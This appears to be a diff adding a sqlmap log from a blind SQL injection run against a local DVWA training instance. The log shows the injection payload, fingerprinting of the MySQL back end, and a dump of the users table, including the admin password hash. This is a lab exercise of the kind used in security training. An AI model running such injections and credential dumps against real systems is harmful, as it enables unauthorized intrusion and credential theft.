@@ -1,0 +1,111 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:46:25 /2026-10-24/
+
+[1/1] URL:
+GET http://host.docker.internal:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+Cookie: PHPSESSID=l3d17kn62v7qtjf3lsfq1od4r2; security=low
+do you want to test this URL? [Y/n/q]
+> Y
+[00:46:25] [INFO] testing URL 'http://host.docker.internal:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit'
+[00:46:25] [INFO] using '/root/.local/share/sqlmap/output/results-10242026_1246am.csv' as the CSV results file in multiple targets mode
+[00:46:25] [INFO] testing connection to the target URL
+[00:46:25] [INFO] checking if the target is protected by some kind of WAF/IPS
+[00:46:25] [INFO] testing if the target URL content is stable
+[00:46:25] [INFO] target URL content is stable
+[00:46:26] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[00:46:26] [INFO] testing for SQL injection on GET parameter 'id'
+[00:46:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:46:26] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[00:46:26] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 19 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 4322=4322 AND 'jPhS'='jPhS&Submit=Submit
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[00:46:26] [INFO] testing MySQL
+[00:46:26] [INFO] confirming MySQL
+[00:46:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[00:46:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[00:46:26] [INFO] fetching current database
+[00:46:26] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[00:46:26] [INFO] retrieved: dvwa
+[00:46:27] [INFO] fetching columns for table 'users' in database 'dvwa'
+
+[00:46:27] [INFO] retrieved: 8
+
+[00:46:27] [INFO] retrieved: user_id
+
+[00:46:28] [INFO] retrieved: first_name
+
+[00:46:29] [INFO] retrieved: last_name
+
+[00:46:30] [INFO] retrieved: user
+
+[00:46:30] [INFO] retrieved: password
+
+[00:46:31] [INFO] retrieved: avatar
+
+[00:46:31] [INFO] retrieved: last_login
+
+[00:46:32] [INFO] retrieved: failed_login
+[00:46:33] [INFO] fetching entries for table 'users' in database 'dvwa'
+[00:46:33] [INFO] fetching number of entries for table 'users' in database 'dvwa'
+
+[00:46:33] [INFO] retrieved: 1
+
+[00:46:33] [INFO] retrieved: admin
+
+[00:46:34] [INFO] retrieved: /hackable/users/admin.jpg
+
+[00:46:36] [INFO] retrieved: 0
+
+[00:46:36] [INFO] retrieved: admin
+
+[00:46:36] [INFO] retrieved: 2026-10-24 00:43:
+[00:47:08] [CRITICAL] unable to connect to the target URL ('Network is unreachable'). sqlmap is going to retry the request(s)
+[00:47:08] [WARNING] unexpected response detected. Will use (extra) validation step in similar cases
+[00:47:08] [WARNING] unexpected HTTP code '200' detected. Will use (extra) validation step in similar cases
+[00:47:08] [WARNING] unexpected HTTP code '404' detected. Will use (extra) validation step in similar cases
+56
+
+[00:47:08] [INFO] retrieved: admin
+
+[00:47:09] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
+
+[00:47:12] [INFO] retrieved: 1
+[00:47:12] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [y/N/q] N
+Database: dvwa
+Table: users
+[1 entry]
++---------+--------+---------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user   | avatar                    | password                         | last_name | first_name | last_login          | failed_login |
++---------+--------+---------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin  | /hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2026-10-24 00:43:56 | 0            |
++---------+--------+---------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[00:47:12] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/host.docker.internal/dump/dvwa/users.csv'
+[00:47:12] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 630 times
+[00:47:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-10242026_1246am.csv'
+[00:47:12] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 00:47:12 /2026-10-24/
+
